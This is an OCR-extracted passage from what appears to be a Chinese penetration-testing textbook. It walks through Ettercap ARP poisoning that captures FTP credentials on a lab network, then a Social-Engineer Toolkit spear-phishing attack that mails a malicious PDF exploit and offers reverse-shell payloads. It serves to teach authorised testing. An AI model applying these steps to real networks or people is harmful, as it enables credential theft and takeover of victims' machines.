Ettercab
Privleges dropped to UID 65534 GID 65534.
33 plugins
42 protocol dissectors
16074 mac vendor fingerprint
57 ports monitored
1766 tcp 05 fingerprint
Randomizing 255 hosts for scanning..
2182 known services
Scanning the whole netmask for 255 hosts.
5 hosts added to the hosts list
图7.10扫描主机界面
ettercap O.8.0
Start Targets
View
Mitm
Filters
Hosts list
H
Scan for hosts
Ctrl+
Load from file.
Ctrl+O
Save to file.
Ctrl+s
图7.11
打开主机列表
ettercap 0.8.0
Start Targets Hosts View Mitm Filters Logging Plugins
Host List 
P Address
MAC Address
Description
192.168.41.1
00:50:56: C0:00:08
192.168.41.2
00:50:56:E9:AF:47
192.168.41.146 00:0C:29:48:66:40
192.168.41.151 00:0C:29:50:F9:AE
192.168.41.254 00:50:56:EE:5D:9E
Delete Host
Add to Target 1
Add to Target 2
33 plugins
42 protocol dissectors
1.6074 mac vendor fingerprint
57 ports monitored
1766 tcp OS fingerprint
2182 known services
Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts..
5 hosts added to the hosts list.
图7.12扫描到的所有主机
· 217 ·
---
## Page 230
第3篇各种渗透测试
（9）该界面显示了扫描到的五台主机的IP地址和MAC地址。在该界面选择其中一台
主机，作为目标系统。这里选择192.168.41.151主机，然后单击AddtoTarget1按钮。添
加目标系统后开始噢探数据包，在菜单栏中依次选择StartStartsniffing命令或按下Ctrl+W
组合键，如图7.13所示。
ettercap 0.8.0
-口x
Targets Hosts View Mitm Filters Logging Plugins 7
Start sniffing
Ctrl+W
fugus dos5
Ctrl+E
ess
Description
Exit
Ctrl+X co:00:08
图7.13开始扫描
（10）启动噢探后，通过使用ARP注入攻击的方法获取到目标系统的重要信息。启动
ARP注入攻击，在菜单栏中依次选择MitmlArppoisonig...命令，如图7.14所示。
ettercap 0.8.0
-ox
Start Targets Hosts View
Fiters Loggng Plugns ?
Host List 
Arp poisoning.-
IP Address
MAC Addres
Icmp redirect...
Port stesling..
192.168.41.1
00:50:56:CC
Dhcp spooing
192.168.41.2
00:50:56:E9
192:168.41.146 00:0C:29:48
Stop mitm attack(s)
图7.14Arp注入攻击图
（11）单击Arppoisonig命令后，将显示如图7.15所示的界面。在该界面选择攻击的
选项，这里选择Sniffremoteconnections。然后单击“确定”按钮，将显示如图7.16所示
的界面。
ettercap 0.8.0
Start Targets Mosts ViewMitmFilters LoggingPlugins?
Host List 
IP Address
MAC Address
Description
192.168.41.1
00:50:56:C0:00:08
192.168.41.2
00:50:56:E9:AF:47
192.168.41.146 00:0C:29:48:66:40
192.168.41.151 00:0C-29:50:F9:AE
192.168.41.254 00:50:56:EE:50:9E
Delete Host
Add to Target 1
Add to Target 2
Starting Unfied sniffing
MITM Attack: ARP Pol
DHCP: [00:0C:29:50:F9:AE] REQUEST 192.168.41.151
body
OHCP: [192.168.41.254] ACK : 192.168.41.151 255.255.255.0 GW 192.168.41.2 DNS
Optional parameters-
192.168.41.2 “localdomain”
Sniff remote connections.
ARP poisoning victims:
 Only poison one-way.
GROUP 1 : 192.168.41.151 00:0C:29:50:F9:AE
确定(0）
取消（C)
GROUP 2 : ANY (all the hosts in the list)
图7.15攻击选项
图7.16攻击界面
• 218 ·
---
## Page 231
第7章权限提升
（12）此时，当某个用户登录192.168.41.151主机时，它的敏感信息将会被传递给攻击
者。本例中捕获到的敏感信息如图7.17所示。
ettercap O.8.0
Start Targets Hosts View MitmFilters LoggingPlugins?
Host List 
IP Address
MAC Address
Description
192.168.41.1
00:50:56:C0:00:08
192.168.41.2
00:50:56:E9:AF:47
192.168.41.146 00:0C:29:48:66:40
192.168.41.151 00:0C:29:50:F9:AE
192.168.41.254 00:50:56:EE:5D:9E
Delete Host
Add to Target 1
Add to Target 2
192.168.41.2 “localdomain*
ARP poisoning victims:
GROUP 1 : 192.168.41.151 00:0C:29:50:F9:AE
GROUP 2 : ANY (allL the hosts in the list)
FTP : 192.168.41.151:21 -> USER: anonymous PASS: 123456
DHCP: [00:0C:29:50:F9:AE] REGUEST 192.168.41.151
DHCP: [192.168.41.254] A CK : 192.168.41.151 255.255.255:0-G)W 192.168.41.2 DNS
192.168.41.2 “localdomain”
图7.17捕获到的敏感信息
学社
为 anonymous，密码为123456。获取这些信息后停止噢探，在菜单栏中依次单击StartStop
sniffing命令，如图7.18所示。
（14）停止噢探后，还需要停止中间人攻击。在菜单栏中依次单击Mitm|Stopmitm
attack（s）命令，将显示如图7.19所示的界面。
ettercap 0.8.0
-0x
Targets Hosts View Mitm Fiters Loging Plugins ?
(F nobody)
Start sniffing
MITM attack(s) stopped
Ctrl+W
Stop sniffing
Ctrl+E
ess
Description
Exit
Ctrl+X Co:00:08
确定(O）
图7.18停止噢探
图7.19停止中间人攻击
（15）在该界面单击“确定”按钮，这样就成功的完成了中间人攻击。
7.4
4使用SET实施攻击
前面介绍了社会工程学工具包（SET）的简单使用。为了能帮助用户更容易的理解社
会工程学的强大功能。本节将介绍使用社会工程学工具包实施各种攻击。
· 219 ·
---
## Page 232
第3篇各种渗透测试
7.4.1针对性钓鱼攻击向量
针对性钓鱼攻击向量通过构造特殊文件格式的漏洞进行渗透攻击，如利用Adobe
Reader8.1.0（PDF阅读器）的漏洞。实现钓鱼攻击向量主要通过发送邮件附件的方式，将
包含渗透代码的文件发送到目标主机。当目标主机的用户打开邮件附件时，目标主机就会
被攻陷和控制。
SET使用简单邮件管理协议（SMTP）的开放代理（匿名的或者需认证的）、Gmail
和Sendmail来发送邮件。SET同时也使用标准电子邮件和基于HTML格式的电子邮件来
发动钓鱼攻击。
【实例7-1】使用SET实现钓鱼攻击向量，本例中通过发送存在渗透代码的PDF格式
文件到目标主机。具体操作步骤如下所示。
（1）启动社会工程学。执行命令如下所示：
root@kali:~# setoolkit
[-] New set_config.py file generated on: 2014-06-06 18:33:39.854805
[-] Verifying configuration update...
[] Update verified, config timestamp is: 2014-06-06 18:33:39.854805
[▪] SET is using the new config. no need to restart
[--]
The Social-Engineer Toolkit (SET)
[--]
Created by: David Kennedy (ReL1K)
[--]
Version:5.4.2
[]
Codename:"Walkers'
Follow us on Twitter: @TrustedSec
Follow me on Twitter: @HackingDave
Homepage: https://www.trustedsec.com
Welcome to the Social-Engineer Toolkit (SET).
The one stop shop for all of your SE needs.
Join us on irc.freenode.net in channel #setoolkit 
The Social-Engineer Toolkit is a product of TrustedSec.
Visit: https://www.trustedsec.com
Select from the menu:
#渗透攻击菜单
1) Social-Engineering Attacks
2)Fast-Track Penetration Testing
3) Third Party Modules
4) Update the Metasploit Framework
5) Update the Social-Engineer Toolkit
6) Update SET configuration
7) Help, Credits, and About
99) Exit the Social-Engineer Toolkit
set>
（2）在以上菜单中选择社会工程学，编号为1，如下所示：
set>1
· 220 ·
---
## Page 233
第7章权限提升
!
/!
!!
!!\
!! Social-Engineer Toolkit !!
ii
ii
Free
!!
！
!!
!
#hugs
!!
！
!!
!！
!I
By: TrustedSec
!/
!1
!/
!/
!/
/0000000000000000/!
/000000000000o000000000o//
/00000000000000000000000//
/C=
/
[--]
The Social-Engineer Toolkit (SET)
[--]
Created by: David Kennedy (ReL1K)
[--]
Version: 5.4.2
[-]
Codename:“Walkers
[--] 
Follow us on Twitter: @TrustedSec
[-]
Follow me on Twitter: @HackingDave
[-]
Homepage: https://www.trustedsec.com
[-]
Welcome to the Social-Engineer Toolkit (SET).
The one stop shop for all of your SE needs.
Join us on irc.freenode.net in channel #setoolkit
The Social-Engineer Toolkit is a product of TrustedSec.
Visit: https://www.trustedsec.com
Select from the menu:
1) Spear-Phishing Attack Vectors
2)Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
6) Arduino-Based Attack Vector
7) SMS Spoofing Attack Vector
8) Wireless Access Point Attack Vector
9) QRCode Generator Attack Vector
10) Powershell AttackVectors
11) Third Party Modules
99) Retun back to the main menu.
set>
（3）在以上菜单中选择攻击类型。这里选择钓鱼攻击向量，编号为1，如下所示：
set> 1
The Spearphishing module allows you to specially craft email messages and send
them to a large (or small) number of people with attached fileformat malicious
payloads. If you want to spoof your email address, be sure "Sendmail is in-
stalled (apt-get install sendmail) and change the config/set_config SENDMAIL=OFF
flag to SENDMAIL=ON.
There are two options, one is getting your feet wet and letting SET do
everything for you (option 1), the second is to create your own FileFormat
payload and use it in your own attack. Either way, good luck and enjoy!
1) Perform a Mass Email Attack
2) Create a FileFormat Payload
3) Create a Social-Engineering Template
99)Retun to Main Menu
· 221 ·
---
## Page 234
第3篇各种渗透测试
以上输出的信息显示了钓鱼攻击向量中可用的工具载荷。
（4）这里选择大规模电子邮件攻击，编号为1，如下所示：
set:phishing>1
Select the file format exploit you want.
The default is the PDF embedded EXE.
**********PAYLOADS**********
1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)
2) SET Custom Written Document UNC LM SMB Capture Attack
3) Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow
4) Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)
5)Adobe Flash Player "Button" Remote Code Execution
6) Adobe CoolType SING Table “uniqueName* Overflow
7) Adobe Flash Player "newfunction" Invalid Pointer Use
8) Adobe Collab.collectEmaillinfo Buffer Overflow
9) Adobe Collab.getlcon Buffer Overflow
10) Adobe JBIG2Decode Memory Corruption Exploit
11) Adobe PDF Embedded EXE Social Engineering
12) Adobe util.printf() Buffer Overflow
13) Custom EXE to VBA (sent via RAR)(RAR required)
14)Adobe U3D CLODProgressiveMeshDeclaration Array Overrun
15) Adobe PDF Embedded EXE Social Engineering (NOJS)
16) Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow
17) Apple QuickTime PICT PnSize Buffer Overflow
18) Nuance PDF Reader v6.0 Launch Stack Buffer Overflow
19) Adobe Reader u3D Memory Corruption Vulnerability
20) MSCOMCTL ActiveX Buffer Overflow (ms12-027)
set:payloads>8
输出的信息显示了钓鱼攻击向量中可以使用的文件格式，默认是PDF格式。
（5）这里利用AbobePDF的Collab.collectEmaillnfo漏洞，所以选择编号8，如下所示：
1) Windows Reverse TCP Shell
Spawn a command shell on victim
and send back to attacker
2) Windows Meterpreter Reverse_TCP
Spawn a meterpreter shell on
victim and send back to attacker
3) Windows Reverse VNC DLL
Spawn a VNC server on victim and
send back to attacker
4) Windows Reverse TCP Shell (x64)
Windows X64 Command Shell,
Reverse TCP Inline
5) Windows Meterpreter Reverse_TCP (X64)
Connect back to the attacker
(Windows x64), Meterpreter
6) Windows Shell Bind_TCP (X64)
Execute payload and create an
accepting port on remote system
7) Windows Meterpreter Reverse HTTPS
Tunnel communication over HTTP
using SSL and use Meterpreter